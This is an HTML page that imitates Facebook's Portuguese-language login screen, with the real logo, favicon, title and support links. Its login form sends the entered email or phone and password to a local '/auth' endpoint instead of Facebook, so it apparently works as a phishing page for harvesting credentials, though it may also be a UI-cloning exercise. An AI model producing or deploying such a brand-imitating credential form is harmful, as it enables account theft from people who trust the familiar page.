<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - entre ou cadastre-se </title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <section class="main">

        <div class="welcome">
            <!--Logo-->


            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo">

            <p class="welcome-text">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da
                sua vida.</p>


        </div>

        <div class="login-cont">
            <!--Login-->

            <form class="login-container" action="/auth" method="post">


                <div class="inputs">
                    <input type="text" name="user" placeholder="Email ou Telefone" class="email" required>

                    <input type="password" name="pwd" class="pw-login" placeholder="Senha">
                </div>

                <div class="logar-se up">

                    <input type="submit" class="sub" value="Entrar">

                </div>

                <div class="alink">
                    <a class="forgout" href="https://www.facebook.com/recover/initiate/?ars=facebook_login">
                        Esqueceu a Senha?
                    </a>
                </div>

                <div id="line"></div>

                <div class="account up">
                    <a class="linkc" href="https://pt-br.facebook.com/r.php?locale=pt_BR&display=page">
                        Criar nova conta</a>
                </div>
            </form>

            <p class="a">
                <a class="page a" href="https://www.facebook.com/pages/create/?ref_type=registration_form">Criar uma
                    Página</a> para uma celebridade, banda ou empresa.
            </p>
        </div>
    </section>
</body>

</html>
